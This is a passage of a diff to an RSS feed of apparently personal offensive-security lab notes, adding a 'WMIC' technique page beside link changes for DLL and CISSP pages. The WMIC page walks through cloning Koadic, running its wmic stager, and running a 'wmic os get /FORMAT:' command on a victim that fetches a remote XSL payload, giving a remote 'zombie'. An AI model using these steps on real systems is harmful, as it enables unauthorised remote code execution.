+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Save the document as &lt;code&gt;Macro Enabled&lt;/code&gt; and open the document to see the execution.
+&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261026152824.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[03] WMIC</title>
+      <link>http://localhost:1313/docs/03_techniques/03-wmic/</link>
+      <pubDate>Mon, 26 Oct 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/03_techniques/03-wmic/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;October 26, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;What is WMIC ?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;what-is-wmic-&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#what-is-wmic-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;WMI is Windows Management Instrumentation is typically used for managing data in a windows operating system Its also highly efficient just like power shell since a user will be able to write scripts to automate tasks in a remote device. Due to this functionality its required to implement security features to prevent any unauthenticated services and operations.&lt;/p&gt;
+&lt;h4&gt;Security with WMIC:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;security-with-wmic&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#security-with-wmic&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;WMI security focuses on protecting access to namespace data. WMI first grants access to groups of users as specified by the &lt;em&gt;WMI Control&lt;/em&gt; and DCOM settings and then providers determine if the user should have access to namespace data. Namespace security depends on standard Windows user &lt;em&gt;security identifiers (SID)&lt;/em&gt; and the &lt;em&gt;security descriptor&lt;/em&gt; for the WMI namespace. You can set namespace security by performing the following actions WMIC is capable of invoking XLS scripts, this allows an attacker to push a malicious excel script which could provide a reverse shell.&lt;/p&gt;
+&lt;p&gt;We will use kodiac to generate malicious XLS script, lets download the framework.&lt;/p&gt;
+&lt;h5&gt;STEP 1: open terminal a type the following command&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-1-open-terminal-a-type-the-following-command&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-1-open-terminal-a-type-the-following-command&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ git clone &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;https://github.com/zerosum0x0/koadic.git&lt;span class=&#34;o&#34;&gt;](&lt;/span&gt;https://github.com/zerosum0x0/koadic.git&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 2: Move to the kodic directory &amp;amp; install the dependencies&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-2-move-to-the-kodic-directory--install-the-dependencies&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-2-move-to-the-kodic-directory--install-the-dependencies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; koadic
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ pip3 install -r requirements.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 3: Run kodic &amp;amp; Generate the XLS file&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-3-run-kodic--generate-the-xls-file&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-3-run-kodic--generate-the-xls-file&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ use stager/js/wmic
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SRVHOST &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Attacker IP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ run&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 4: Download the payload from the victims device through WIMC command.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-4-download-the-payload-from-the-victims-device-through-wimc-command&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-4-download-the-payload-from-the-victims-device-through-wimc-command&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ wmic os get /FORMAT:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[http://10.0.2.4:9996/payload.xls](http://10.0.2.4:9996/payload.xls)”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 5: From the attackers console, you can see the infected zombie&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-5-from-the-attackers-console-you-can-see-the-infected-zombie&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-5-from-the-attackers-console-you-can-see-the-infected-zombie&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ zombies &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122001534.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
       </description>
     </item>
     
     <item>
       <title>[04] DLL</title>
-      <link>http://localhost:40231/docs/03_techniques/04-dll/</link>
+      <link>http://localhost:1313/docs/03_techniques/04-dll/</link>
       <pubDate>Mon, 26 Oct 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/03_techniques/04-dll/</guid>
+      <guid>http://localhost:1313/docs/03_techniques/04-dll/</guid>
       <description>
         
         
@@ -3006,7 +3174,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
   &lt;/button&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/03_techniques/assets/Pasted_image_20261122002301.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122002301.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h5&gt;STEP 4: Interact with the infected host from the console&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-4-interact-with-the-infected-host-from-the-console&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#step-4-interact-with-the-infected-host-from-the-console&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
 
@@ -3042,7 +3210,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
   &lt;/button&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/03_techniques/assets/Pasted_image_20261122002233.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122002233.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h5&gt;STEP 2: Copy the command produced by metasploit and run it in the victims device.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-2-copy-the-command-produced-by-metasploit-and-run-it-in-the-victims-device&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#step-2-copy-the-command-produced-by-metasploit-and-run-it-in-the-victims-device&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
 
@@ -3074,17 +3242,17 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
   &lt;/button&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/03_techniques/assets/Pasted_image_20261122002211.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122002211.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
       </description>
     </item>
     
     <item>
       <title>D0 CISSP Prep</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d0-cissp-prep/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d0-cissp-prep/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d0-cissp-prep/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d0-cissp-prep/</guid>
       <description>
         
         
@@ -3121,7 +3289,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;CISSP Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cissp-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#cissp-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930004910.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#cissp-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930004910.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 
       </description>
@@ -3129,10 +3297,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D1 Security and Risk Management</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d1-security-and-risk-management/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d1-security-and-risk-management/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d1-security-and-risk-management/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d1-security-and-risk-management/</guid>
       <description>
         
         
@@ -3169,7 +3337,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 1 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-1-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-1-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001202.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-1-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001202.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2&gt;Due Care &amp;amp; Due Diligence&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;due-care--due-diligence&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#due-care--due-diligence&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;table&gt;
@@ -3459,10 +3627,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D2 Asset Security</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d2-asset-security/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d2-asset-security/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d2-asset-security/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d2-asset-security/</guid>
       <description>
         
         
@@ -3499,7 +3667,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 2 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-2-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-2-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001319.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-2-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001319.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2&gt;Data Roles &amp;amp; Responsibilities&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;data-roles--responsibilities&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#data-roles--responsibilities&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;table&gt;
@@ -3697,10 +3865,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D3 Security Architecture and Engineering</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d3-security-architecture-and-engineering/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d3-security-architecture-and-engineering/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d3-security-architecture-and-engineering/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d3-security-architecture-and-engineering/</guid>
       <description>
         
         
@@ -3737,7 +3905,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 3 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-3-cheat-sheet&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#domain-3-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/04_playbooks/cissp/assets/Pasted_image_20260930001411.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#domain-3-cheat-sheet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/04_playbooks/cissp/assets/Pasted_image_20260930001411.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2&gt;Cryptography — Pick the Right Tool&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cryptography--pick-the-right-tool&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#cryptography--pick-the-right-tool&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;table&gt;
@@ -3830,10 +3998,10 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
     
     <item>
       <title>D4 Communication and Network Security</title>
-      <link>http://localhost:40231/docs/04_playbooks/cissp/d4-communication-and-network-security/</link>
+      <link>http://localhost:1313/docs/04_playbooks/cissp/d4-communication-and-network-security/</link>
       <pubDate>Tue, 29 Sep 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/04_playbooks/cissp/d4-communication-and-network-security/</guid>
+      <guid>http://localhost:1313/docs/04_playbooks/cissp/d4-communication-and-network-security/</guid>
       <description>
         
         
@@ -3870,7 +4038,7 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Domain 4 Cheat Sheet&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;domain-4-cheat-sheet&#34;&gt;&lt;/span&gt;
